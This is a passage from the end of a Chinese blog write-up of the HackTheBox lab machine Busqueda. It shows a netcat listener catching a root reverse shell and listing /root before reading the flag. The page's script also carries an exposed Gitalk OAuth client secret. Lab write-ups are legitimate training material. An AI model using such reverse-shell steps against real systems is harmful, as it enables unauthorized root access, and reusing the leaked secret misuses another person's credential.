/opt/scripts/system-checkup.py full-checkup<br></code></pre></td></tr></table></figure>

<p>本地nc监听一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo nc -nlvp 8080<br>listening on [any] 8080 ...<br>connect to [&lt;HTB_VPN_IP&gt;] from (UNKNOWN) [10.10.11.208] 53532<br>root@busqueda:/home/svc/.local/bin<span class="hljs-comment"># cd /root</span><br><span class="hljs-built_in">cd</span> /root<br>root@busqueda:~<span class="hljs-comment"># ls -la</span><br><span class="hljs-built_in">ls</span> -la<br>total 60<br>drwx------  9 root root 4096 Apr  3 16:01 .<br>drwxr-xr-x 19 root root 4096 Mar  1 10:46 ..<br>lrwxrwxrwx  1 root root    9 Feb 20 12:09 .bash_history -&gt; /dev/null<br>-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc<br>drwx------  3 root root 4096 Mar  1 10:46 .cache<br>drwx------  3 root root 4096 Mar  1 10:46 .config<br>-rw-r-----  1 root root  430 Apr  3 15:13 ecosystem.config.js<br>-rw-r--r--  1 root root  104 Apr  3 08:58 .gitconfig<br>drwxr-xr-x  3 root root 4096 Mar  1 10:46 .<span class="hljs-built_in">local</span><br>-rw-------  1 root root   50 Feb 20 12:04 .my.cnf<br>lrwxrwxrwx  1 root root    9 Feb 20 12:12 .mysql_history -&gt; /dev/null<br>drwxr-xr-x  4 root root 4096 Mar  1 10:46 .npm<br>drwxr-xr-x  5 root root 4096 Jul 19 03:03 .pm2<br>-rw-r--r--  1 root root  161 Jul  9  2019 .profile<br>-rw-r-----  1 root root   33 Jul 19 03:03 root.txt<br>drwxr-xr-x  4 root root 4096 Apr  3 16:01 scripts<br>drwx------  3 root root 4096 Mar  1 10:46 snap<br>root@busqueda:~<span class="hljs-comment"># cat root.txt</span><br></code></pre></td></tr></table></figure>

<p> 拿下，符合我们的预期。</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/07/18/MonitorsTwo/">[HTB]  MonitorsTwo Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="gitalk-sel"></button></div><div id="gitalk"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Dr.T3yT3y</a></h1><div id="description"><p>May the flame guide thee</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap"><span class="toc-number">2.1.</span> <span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#whatweb"><span class="toc-number">2.2.</span> <span class="toc-text">whatweb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nikto"><span class="toc-number">2.3.</span> <span class="toc-text">nikto</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">web渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E8%AF%86%E5%88%AB"><span class="toc-number">3.1.</span> <span class="toc-text">服务识别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Searchor"><span class="toc-number">3.2.</span> <span class="toc-text">Searchor</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">提权</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plu</a></nobr><wbr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {gitalk = new Gitalk({
 clientID: 'd746fee266fd40784c87',
 clientSecret: '18467221d189fe0e0b51bd234fcd04785a28ab09',
 repo: 'T3yT3y.github.io',
 owner: 'T3yT3y',
 admin: ['T3yT3y'],
 distractionFreeMode: false,
 id: location.pathname
});
if (document.querySelector("#gitalk")) gitalk.render("gitalk");code.findCode();
document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>